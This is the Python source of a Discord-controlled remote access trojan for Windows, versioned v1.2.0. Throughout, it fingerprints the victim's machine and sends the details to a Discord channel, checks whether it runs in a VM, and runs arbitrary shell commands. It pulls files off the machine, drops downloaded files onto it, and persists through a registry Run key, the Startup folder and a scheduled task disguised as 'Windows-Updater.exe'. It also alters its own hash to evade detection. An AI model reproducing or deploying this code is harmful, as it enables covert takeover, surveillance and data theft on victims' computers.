import discord
from discord.ext import commands
import os
import subprocess as sp
import requests
import random
import platform
import re
from urllib.request import Request, urlopen
from datetime import datetime
import shutil
import sys
import ctypes
from winreg import *
from ctypes import *

VERSION = "v1.2.0"


BOT_TOKEN = "ENTER YOUR CUSTOM HERE"
TOKEN_WEBHOOK = ""
KEYLOGGER_WEBHOOK = ""

SCREENSHOTS_ID = ""
DOWNLOADS_ID = ""
AGENT_ONLINE_ID = ""
CREDENTIALS_ID = ""


client = commands.Bot(command_prefix="!", intents=discord.Intents.all(), help_command=None)

def isVM():
    rules = ['Virtualbox', 'vmbox', 'vmware']
    command = sp.Popen("SYSTEMINFO | findstr  \"System Info\"", stderr=sp.PIPE,
                                stdin=sp.DEVNULL, stdout=sp.PIPE, shell=True, text=True,
                                creationflags=0x08000000)
    out, err = command.communicate()
    command.wait()
    for rule in rules:
        if re.search(rule, out, re.IGNORECASE):
            return True
    return False

def isAdmin():
    try:
        is_admin = (os.getuid() == 0)
    except AttributeError:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    return is_admin

def getIP():            
        try:
            IP = urlopen(Request("https://ipv4.myip.wtf/text")).read().decode().strip()
        except Exception as e:
            IP = "None"
        return IP

def getBits():
    try:
        BITS = platform.architecture()[0]
    except Exception as e:
        BITS = "None"
    return BITS

def getUsername():
    try:
        USERNAME = os.getlogin()
    except Exception as e:
        USERNAME = "None"
    return USERNAME

def getOS():
        try:
            OS = platform.platform()
        except Exception as e:
            OS = "None"
        return OS

def getCPU():
        try:
            CPU = platform.processor()
        except Exception as e:
            CPU = "None"
        return CPU

def getHostname():
    try:
        HOSTNAME = platform.node()
    except Exception as e:
        HOSTNAME = "None"
    return HOSTNAME

def createConfig():
    try:
        path = fr'"C:\Users\{USERNAME}\.config"'
        new_path = path[1:]
        new_path = new_path[:-1]
        os.mkdir(new_path)     
        os.system(f"attrib +h {path}")

    except WindowsError as e:
        if e.winerror == 183:
            pass

def createUploads():
    try:
        path = fr'C:\Users\{USERNAME}\.config\uploads'
        os.mkdir(path)
    except WindowsError as e:
        if e.winerror == 183:
            pass

@client.command(name='cd',pass_context=True)
async def cd(context):
    command = context.message.content.replace("!cd ", "")
    word_list = command.split()
    if int(word_list[0]) == int(ID):
        path = word_list[1]
        try:
            os.chdir(path)
            my_embed = discord.Embed(title=f"Succesfully changed directory to: {path}", color=0x00FF00)
            await context.message.channel.send(embed=my_embed)
        except Exception as e:
            my_embed = discord.Embed(title=f"Error while changing directory:\n{e}", color=0xFF0000)
            await context.message.channel.send(embed=my_embed)

@client.command(name='process',pass_context=True)
async def process(context):
    command = context.message.content.replace("!process ", "")
    result = sp.Popen("tasklist", stderr=sp.PIPE, stdin=sp.DEVNULL, stdout=sp.PIPE, shell=True, text=True, creationflags=0x08000000)
    out, err = result.communicate()
    result.wait()
    word_list = command.split()
    if int(word_list[0]) == int(ID):
        if len(out) > 4000:
            path = os.environ["temp"] +"\\response.txt"         
            with open(path, 'w') as file:
                file.write(out)
            await context.message.channel.send(f"**Message was too large, sending a file with the response instead**")
            await context.message.channel.send(file=discord.File(path))
            os.remove(path)
        else:
            await context.message.channel.send(f"```\n{out}\n```")

@client.command(name='download',pass_context=True)
async def download(context):
    command = context.message.content.replace("!download ", "")
    word_list = command.split()
    channel = client.get_channel(DOWNLOADS_ID)
    if int(word_list[0]) == int(ID):
        path = word_list[1].replace("USERNAME", USERNAME)
        try:
            await channel.send(f"**Agent #{ID}** Requested File:", file=discord.File(path))
            my_embed = discord.Embed(title=f"File succesfully downloaded from Agent#{ID}", color=0x00FF00)
            await context.message.channel.send(embed=my_embed)
        except Exception as e:
            my_embed = discord.Embed(title=f"Error while downloading from Agent#{ID}:\n{e}", color=0xFF0000)
            await context.message.channel.send(embed=my_embed) 

@client.command(name='upload')
async def upload(context):
    path = fr'C:\Users\{USERNAME}\.config\uploads'
    command = context.message.content.replace("!upload ", "")
    word_list = command.split()
    if int(word_list[0]) == int(ID):
        url = word_list[1]
        name = word_list[2]
        if name == "":
            await context.send("Please enter a name for the file")
        else:
            try:
                r = requests.get(url, allow_redirects=True, verify=False)
                open(fr"{path}\{name}", 'wb').write(r.content)
                my_embed = discord.Embed(title=f"{name} has been uploaded to Agent#{ID}", color=0x00FF00)
                await context.message.channel.send(embed=my_embed)
            except Exception as e:
                my_embed = discord.Embed(title=f"Error while uploading {name} to Agent#{ID}:\n{e}", color=0xFF0000)
                await context.message.channel.send(embed=my_embed)   
    else:
        pass

@client.command(name='persistent')
async def persistent(context):
    command = context.message.content.replace("!persistent ", "") # added
    word_list = command.split() # added
    if word_list[0] == str(ID) or word_list[0] == str(os.getlogin()): # added
        try:
            backdoor_location = os.environ["appdata"] + "\\Windows-Updater.exe"
            startup_backdoor_location = os.environ["appdata"] + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Windows-Updater.exe"
            task_scheduler_location = os.environ['USERPROFILE'] + "\\.config\\Windows-Updater.exe"

            if not os.path.exists(backdoor_location) or not os.path.exists(startup_backdoor_location) or not os.path.exists(task_scheduler_location):

                if not os.path.exists(backdoor_location):
                    shutil.copyfile(sys.executable, backdoor_location)
                    sp.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + backdoor_location + '" /f', shell=True)

                if not os.path.exists(startup_backdoor_location):# added
                    shutil.copyfile(sys.executable, startup_backdoor_location) # added

                if not os.path.exists(task_scheduler_location): # added
                    shutil.copyfile(sys.executable, task_scheduler_location) # added
                    output = os.popen(""" PowerShell /c Get-ScheduledTask "Device-Synchronize" """).read()
                    if "Running" in output:
                        pass
                    else:
                        # note: It is always running so task scheduler does not spawn more than 1 process
                        sp.call(f'schtasks /create /sc MINUTE /mo 1 /tn "Device-Synchronize" /tr {task_scheduler_location}', shell=True)

                my_embed = discord.Embed(title=f"Persistent update created on Agent#{ID}", color=0x00FF00)
                await context.message.channel.send(embed=my_embed)
            else:
                my_embed = discord.Embed(title=f"Persistence already enabled on Agent#{ID}", color=0xFF0000)
                await context.message.channel.send(embed=my_embed)
        except Exception as e:
            my_embed = discord.Embed(title=f"Error while making Agent#{ID} persistent:\n{e}", color=0xFF0000)
            await context.message.channel.send(embed=my_embed)

@client.command(name='persistent_all') # added
async def persistent(context):
    try:
        backdoor_location = os.environ["appdata"] + "\\Windows-Updater.exe"
        startup_backdoor_location = os.environ["appdata"] + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Windows-Updater.exe"
        task_scheduler_location = os.environ['USERPROFILE'] + "\\.config\\Windows-Updater.exe"

        if not os.path.exists(backdoor_location) or not os.path.exists(startup_backdoor_location) or not os.path.exists(task_scheduler_location):

            if not os.path.exists(backdoor_location):
                shutil.copyfile(sys.executable, backdoor_location)
                sp.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + backdoor_location + '" /f', shell=True)

            if not os.path.exists(startup_backdoor_location):# added
                shutil.copyfile(sys.executable, startup_backdoor_location) # added

            if not os.path.exists(task_scheduler_location): # added
                shutil.copyfile(sys.executable, task_scheduler_location) # added
                output = os.popen(""" PowerShell /c Get-ScheduledTask "Device-Synchronize" """).read()
                if "Running" in output:
                    pass
                else:
                    # note: It is always running so task scheduler does not spawn more than 1 process
                    sp.call(f'schtasks /create /sc MINUTE /mo 1 /tn "Device-Synchronize" /tr {task_scheduler_location}', shell=True) 

            my_embed = discord.Embed(title=f"Persistent update created on Agent#{ID}", color=0x00FF00)
            await context.message.channel.send(embed=my_embed)
        else:
            my_embed = discord.Embed(title=f"Persistence already enabled on Agent#{ID}", color=0xFF0000)
            await context.message.channel.send(embed=my_embed)
    except Exception as e:
        my_embed = discord.Embed(title=f"Error while making Agent#{ID} persistent:\n{e}", color=0xFF0000)
        await context.message.channel.send(embed=my_embed)

@client.command(name='cmd')
async def cmd(context):
    command = context.message.content.replace("!cmd ", "")
    word_list = command.split()
    if word_list[0] == str(ID):
        word_list.pop(0)
        final_command = " ".join(word_list)
        
        result = sp.Popen(final_command.split(), stderr=sp.PIPE, stdin=sp.DEVNULL, stdout=sp.PIPE, shell=True, text=True, creationflags=0x08000000)
        out, err = result.communicate()
        result.wait()
        
        if len(out) > 4000:
            path = os.environ["temp"] +"\\response.txt"     
            with open(path, 'w') as file:
                file.write(out)
            await context.message.channel.send(f"**Message was too large, sending a file with the response instead**")
            await context.message.channel.send(file=discord.File(path))
            os.remove(path)
        else:
            await context.message.channel.send(f"```\n{out}{err}\n```") # mlyasota: added {err}
    else:
        final_command = " ".join(word_list)
        
        result = sp.Popen(final_command.split(), stderr=sp.PIPE, stdin=sp.DEVNULL, stdout=sp.PIPE, shell=True, text=True, creationflags=0x08000000)
        out, err = result.communicate()
        result.wait()
        
        if len(out) > 4000:
            path = os.environ["temp"] +"\\response.txt"      
            with open(path, 'w') as file:
                file.write(out)
            await context.message.channel.send(f"**Message was too large, sending a file with the response instead**")
            await context.message.channel.send(file=discord.File(path))
            os.remove(path)
        else:
            await context.message.channel.send(f"```\n{out}{err}\n```") # mlyasota: added {err}

@client.command(name='ls')
async def ls(context):
    my_embed = discord.Embed(title=f"Agent #{ID}   IP: {IP}", color=0xADD8E6)
    my_embed.add_field(name="**OS**", value=OS, inline=True)
    my_embed.add_field(name="**Username**", value=USERNAME, inline=True)

    await context.message.channel.send(embed=my_embed)

@client.command(name='version')
async def version(context):
    command = context.message.content.replace("!version ", "")
    word_list = command.split()
    if word_list[0] == str(ID):
         my_embed = discord.Embed(title=f"Agent#{ID} Version:{VERSION}", color=0x0000FF)
         await context.message.channel.send(embed=my_embed)

@client.command(name='terminate')
async def terminate(context):
    command = context.message.content.replace("!terminate ", "")
    word_list = command.split()
    # if int(word_list[0]) == int(ID):  
    if str(word_list[0]) == str(ID): # changed
        my_embed = discord.Embed(title=f"Terminating Connection With Agent#{ID}", color=0x00FF00)
        await context.message.channel.send(embed=my_embed)
        await client.close()        
        sys.exit()
    else:
        pass

@client.command(name='selfdestruct')
async def selfdestruct(context):
    command = context.message.content.replace("!selfdestruct ", "")
    word_list = command.split()
    # if word_list[0] == str(ID):
    if word_list[0] == str(ID) or word_list[0] == str(os.getlogin()):
        try:        
            update_location = os.environ["appdata"] + "\\Windows-Updater.exe"
            startup_backdoor_location = os.environ["appdata"] + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Windows-Updater.exe" # added
            task_scheduler_location = os.environ['USERPROFILE'] + "\\.config\\Windows-Updater.exe" # added
            config_location = fr'C:\Users\{USERNAME}\.config'

            if os.path.exists(update_location):
                sp.Popen(["timeout", "5", "&", "DEL", update_location], creationflags=sp.CREATE_NO_WINDOW, shell=True) # Added 
                sp.call('reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /f', shell=True)

            if os.path.exists(startup_backdoor_location): # added
                sp.Popen(["timeout", "5", "&", "DEL", startup_backdoor_location], creationflags=sp.CREATE_NO_WINDOW, shell=True) # Added    

            if os.path.exists(task_scheduler_location): # added
                sp.Popen(["timeout", "5", "&", "DEL", task_scheduler_location], creationflags=sp.CREATE_NO_WINDOW, shell=True)          
                sp.call('schtasks /delete "Device-Synchronize" /f', shell=True)

            if os.path.exists(config_location):
                shutil.rmtree(config_location)
            
            my_embed = discord.Embed(title=f"Self-Destruction on Agent#{ID} Completed Succesfully", color=0x00FF00)
            await context.message.channel.send(embed=my_embed)
            await client.close()        
            sys.exit()

        except Exception as e:
            my_embed = discord.Embed(title=f"Error while removing Agent#{ID} persistence:\n{e}", color=0xFF0000)
            await context.message.channel.send(embed=my_embed)

@client.command(name='fresh_hash') # added
async def polymorph(context):
    command = context.message.content.replace("!fresh_hash ", "")
    word_list = command.split()
    if word_list[0] == str(ID) or word_list[0] == str(os.getlogin()):
        try:
            file_location = sys.executable
            shutil.copyfile(file_location, f'{file_location}.tmp')
            with open(f'{file_location}.tmp', 'a+b') as fp: 
                fp.write(b'\x00'*random.randint(1,100))
            sp.Popen(["timeout", "5", "&", "move", "/Y", f'{file_location}.tmp', file_location, "&", "cmd", "/c", file_location], creationflags=sp.CREATE_NO_WINDOW, shell=True)

            my_embed = discord.Embed(title=f"Fresh_Hash on Agent#{ID} Completed Succesfully", color=0x00FF00)
            await context.message.channel.send(embed=my_embed)
            await client.close()   
            sys.exit()

        except Exception as e:
            my_embed = discord.Embed(title=f"Error while running fresh_hash on Agent#{ID}:\n{e}", color=0xFF0000)
            await context.message.channel.send(embed=my_embed)

@client.event
async def on_ready():
    channel = client.get_channel(AGENT_ONLINE_ID)
    now = datetime.now()
    my_embed = discord.Embed(title=f"{MSG}",description=f"**Time: {now.strftime('%d/%m/%Y %H:%M:%S')}**", color=color)
    my_embed.add_field(name="**IP**", value=IP, inline=True)
    my_embed.add_field(name="**Bits**", value=BITS, inline=True)
    my_embed.add_field(name="**HostName**", value=HOSTNAME, inline=True)
    my_embed.add_field(name="**OS**", value=OS, inline=True) 
    my_embed.add_field(name="**Username**", value=USERNAME, inline=True)
    my_embed.add_field(name="**CPU**", value=CPU, inline=False)
    my_embed.add_field(name="**Is Admin**", value=ISADMIN, inline=True)
    my_embed.add_field(name="**Is VM**", value=ISVM, inline=True)
    # my_embed.add_field(name="**Auto Keylogger**", value=KEYLOG, inline=True)
    await channel.send(embed=my_embed)


ISVM = isVM()
OS = getOS()
CPU = getCPU()
IP = getIP()
BITS = getBits()
HOSTNAME = getHostname()
USERNAME = getUsername()
createConfig()
createUploads()
ISADMIN = isAdmin()


ID =  f'{os.getlogin()}-{random.randint(1, 10000)}'
MSG = f"Agent Online #{ID}"
color = 0x0000FF


client.run(BOT_TOKEN)